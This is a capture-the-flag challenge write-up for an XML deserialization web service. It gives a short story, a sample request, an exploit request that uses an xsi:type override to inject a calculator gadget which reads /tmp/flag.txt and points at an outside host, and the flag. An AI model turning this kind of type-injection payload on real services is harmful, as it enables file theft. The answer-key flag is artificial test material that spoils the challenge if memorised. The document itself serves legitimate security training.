## Background

 Author: spipm
 Categories: Webservices
 Difficulty: Easy to Medium

## Technical

This XML service deserializes user input. It has an object field in its class that allows users to enter all objects in scope, and it can be used to get the flag using the Calculator class as a gadget.

## Story

It's a busy day in class. The teacher bot explains that the students need to use the nodecalculator service to calculate their binary distance to the closest leader bot, but the service is still being made. The young bots complain to you, "This doesn't make any sense to me, although to be honest, I didn't make any notes. You're a human, can't you figure out how this service works?"

Can you figure out how to use this service?

Sample request:
(POST request, Content-Type is application/xml)
<Node><location>testing</location></Node>

![Calculator](./calculator.jpg "Calculator") 

## Exploit

```
POST /NodeCalculator/nodeCalc HTTP/1.1
Host: localhost:8080
Content-Type: application/xml
Content-Length: 377

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Node>
<constructor xsi:type="calculator" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<locationA>noxxe</locationA><locationB>/tmp/flag.txt</locationB>
	<serverValidationCheck>http://host/</serverValidationCheck>
</constructor>
<location>testing</location>
</Node>
```

## Flag

brck{Y0u_Pay3d_Att3nt10n_In_Cl4ss}
